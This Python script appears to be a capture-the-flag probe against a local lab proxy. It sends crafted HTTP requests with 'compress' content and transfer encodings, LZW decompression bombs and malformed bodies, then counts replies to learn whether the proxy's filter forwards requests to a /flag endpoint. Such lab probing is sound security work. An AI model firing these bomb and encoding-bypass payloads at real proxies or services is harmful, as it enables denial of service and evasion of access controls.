#!/usr/bin/env python3
"""
Fresh-eyes probe: the `compress`/LZW content-coding branch of proxoxy.

Never sent before by any session. Targets the local full-stack lab
`mccrab3l` (proxoxy 28888 -> gunicorn 28900) by default.

Discriminator, per the documented failure mode in NOTES.md: two SEPARATE
writes, never pipelined. Write the probe, drain, then write `GET /health`,
drain. Count complete responses.
  2 responses -> proxoxy FORWARDED the probe
  1 response  -> proxoxy DROPPED the probe (rule hit), connection still usable
  0 responses -> proxoxy CLOSED (parse error)
"""
import socket
import sys
import time

import os
_t = os.environ.get("TARGET", "127.0.0.1:28888")
if len(sys.argv) > 1:
    _t = sys.argv[1] if ":" in sys.argv[1] else "127.0.0.1:" + sys.argv[1]
HOST, PORT = _t.rsplit(":", 1)
PORT = int(PORT)

SMALL = open("/tmp/lzwgen/out_small.z", "rb").read()   # -> b"beans"
BOMB = open("/tmp/lzwgen/out_bomb.z", "rb").read()     # -> 32 MiB, blows 16 MiB cap
MID = open("/tmp/lzwgen/out_mid.z", "rb").read()       # -> 8 MiB, under the cap

HEALTH = b"GET /health HTTP/1.1\r\nHost: x\r\nConnection: keep-alive\r\n\r\n"


def build(brevski, headers, body):
    h = [b"POST /flag HTTP/1.1", b"Host: x", b"Connection: keep-alive"]
    if brevski is not None:
        h.append(b"brevski: " + brevski)
    h.extend(headers)
    return b"\r\n".join(h) + b"\r\n\r\n" + body


def chunkify(body):
    return b"%x\r\n%s\r\n0\r\n\r\n" % (len(body), body)


def drain(s, budget=2.0):
    s.settimeout(budget)
    buf = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            buf += d
            if b"\r\n\r\n" in buf and len(buf) > 16:
                # keep reading briefly in case more is coming
                s.settimeout(0.35)
    except socket.timeout:
        pass
    except OSError:
        pass
    return buf


def count_responses(buf):
    return buf.count(b"HTTP/1.1 ")


def run(name, raw):
    try:
        s = socket.create_connection((HOST, PORT), timeout=6)
    except OSError as e:
        return name, "CONNERR", str(e), ""
    try:
        s.sendall(raw)
        a = drain(s, 3.0)
        try:
            s.sendall(HEALTH)
            b = drain(s, 2.0)
        except OSError:
            b = b""
        total = a + b
        n = count_responses(total)
        verdict = {0: "CLOSED", 1: "DROPPED", 2: "FORWARDED"}.get(n, "N=%d" % n)
        first = total.split(b"\r\n", 1)[0].decode("latin-1") if total else ""
        flag = "FLAG!" if b"TFCCTF{" in total or b"fake_flag" in total else ""
        return name, verdict, first, flag
    finally:
        s.close()


def cases():
    for brev in (b"george", b"zzz"):
        tag = "G" if brev == b"george" else "z"
        yield ("%s baseline CL0" % tag, build(brev, [b"Content-Length: 0"], b""))
        yield ("%s CE:compress small" % tag,
               build(brev, [b"Content-Encoding: compress",
                            b"Content-Length: %d" % len(SMALL)], SMALL))
        yield ("%s CE:x-compress small" % tag,
               build(brev, [b"Content-Encoding: x-compress",
                            b"Content-Length: %d" % len(SMALL)], SMALL))
        yield ("%s CE:compress BOMB(32M)" % tag,
               build(brev, [b"Content-Encoding: compress",
                            b"Content-Length: %d" % len(BOMB)], BOMB))
        yield ("%s CE:compress MID(8M)" % tag,
               build(brev, [b"Content-Encoding: compress",
                            b"Content-Length: %d" % len(MID)], MID))
        trunc = BOMB[: len(BOMB) // 2]
        yield ("%s CE:compress TRUNC" % tag,
               build(brev, [b"Content-Encoding: compress",
                            b"Content-Length: %d" % len(trunc)], trunc))
        garb = b"\x1f\x9d\x90" + b"\xff" * 40
        yield ("%s CE:compress GARBAGE" % tag,
               build(brev, [b"Content-Encoding: compress",
                            b"Content-Length: %d" % len(garb)], garb))
        nomagic = b"\x00" * 40
        yield ("%s CE:compress NOMAGIC" % tag,
               build(brev, [b"Content-Encoding: compress",
                            b"Content-Length: %d" % len(nomagic)], nomagic))
        yield ("%s CE:gzip,compress small" % tag,
               build(brev, [b"Content-Encoding: gzip, compress",
                            b"Content-Length: %d" % len(SMALL)], SMALL))
        # transfer-coding side
        yield ("%s TE:compress,chunked BOMB" % tag,
               build(brev, [b"Transfer-Encoding: compress, chunked"],
                     chunkify(BOMB)))
        yield ("%s TE:compress,chunked small" % tag,
               build(brev, [b"Transfer-Encoding: compress, chunked"],
                     chunkify(SMALL)))
        yield ("%s TE:x-compress,chunked BOMB" % tag,
               build(brev, [b"Transfer-Encoding: x-compress, chunked"],
                     chunkify(BOMB)))
        yield ("%s TE:compress (alone) small" % tag,
               build(brev, [b"Transfer-Encoding: compress",
                            b"Content-Length: %d" % len(SMALL)], SMALL))


def main():
    print("target %s:%d" % (HOST, PORT))
    print("%-32s %-10s %-30s %s" % ("case", "verdict", "first line", ""))
    for name, raw in cases():
        n, v, f, fl = run(name, raw)
        print("%-32s %-10s %-30s %s" % (n, v, f[:30], fl))
        time.sleep(0.05)


if __name__ == "__main__":
    main()
